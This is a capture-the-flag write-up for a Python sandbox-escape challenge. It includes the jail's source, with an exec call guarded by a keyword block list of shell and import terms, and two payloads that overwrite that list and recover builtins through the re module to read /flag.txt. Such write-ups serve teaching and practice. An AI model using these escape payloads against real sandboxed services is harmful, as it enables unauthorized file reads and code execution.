# pyjail

#### Description:
```
Escape me plz.

EU instance: 207.180.200.166 1024

US instance: 45.134.3.200 1024
```
#### Files:
jailbreak.py
```python
#!/usr/bin/env python3

import re
from sys import modules, version

banned = "import|chr|os|sys|system|builtin|exec|eval|subprocess|pty|popen|read|get_data"
search_func = lambda word: re.compile(r"\b({0})\b".format(word), flags=re.IGNORECASE).search

modules.clear()
del modules

def main():
    print(f"{version}\n")
    print("What would you like to say?")
    for _ in range(2):
        text = input('>>> ').lower()
        check = search_func(banned)(''.join(text.split("__")))
        if check:
            print(f"Nope, we ain't letting you use {check.group(0)}!")
            break
        if re.match("^(_?[A-Za-z0-9])*[A-Za-z](_?[A-Za-z0-9])*$", text):
            print("You aren't getting through that easily, come on.")
            break
        else:
            exec(text, {'globals': globals(), '__builtins__': {}}, {'print':print})

if __name__ == "__main__":
    main()
```

#### Auther:
pop_eax & Tango
#### Points and solvers:
At the end of the CTF, 95 teams solved this challenge and it was worth 437 points.

## Solution:
We first read the code carfully, notice we have two payloads to enter the code and we assume that we need to read a file in order to win.   
There are two checks that payload needs to pass, first check makes sure the payload does not contain the words `import`, `chr`, `os` etc. and the second check is quite basic and we can ignore it for now. 
Let's create the first payload with intention to remove the bounderies for the second payload, unlike in C when running an `exec` command we can interact with the variables of the progam, 
this means we can try to overwrite the `banned` or the `search_func` variables. Global python variables are saved in the `globals` dictionary, when printing it (payload = `print(globals)`) we recive:

```python
{'__name__': '__main__', '__doc__': ..., 're': <module 're' from '/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/re.py'>, ..., 'banned': 'import|chr|os|sys|system|builtin|exec|eval|subprocess|pty|popen|read|get_data', 'search_func': ...}
```

Lets indeed overwrite `banned`: payload = `globals['banned'] = 'string_we_are_never_going_to_use'`, when printing again we get:

```python
{'__name__': '__main__', '__doc__': ..., 're': <module 're' from '/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/re.py'>, ..., 'banned': 'string_we_are_never_going_to_use', 'search_func': ...}
```

Great! The second payload [can be whatever we want](https://i.imgur.com/pEq5Ohz.jpg) it to be.   
Now for the second payload. We cannot use `open` since the `open` function is part of the python `__builtins__`, a function that is built in in the laguage, and when running `exec` with `'__builtins__': {}` all of our built in function s were removed.
So what next? After a quick google search "How to restore builtins" you will arrive to [this stackoverflow answer](https://stackoverflow.com/a/25824045/7501501) that says that each python module contains builtin for itself! 
In the globals we see we can access the `re module` lets try to use the open function from this module's builtins:   
second payload = `print(globals['re'].__builtins__['open'])`

```python
<built-in function open>
```

Once again, success, now we can use any builtin function we want, even importing other modules: `globals['re'].__builtins__['__import__']('os')`, after messing around with `os` to find the flag in the file system we find that the path is `/flag.txt`, let's print it:

payload 1: `globals['banned'] = 'string_we_are_never_going_to_use'`   
payload 2: `__builtins__ = globals['re'].__builtins__; print(__builtins__['open']('/flag.txt', 'rb').read());`

### Flag:
`flag{}`

(The server shut down after the event so I do not remember the flag, believe me it works lol)
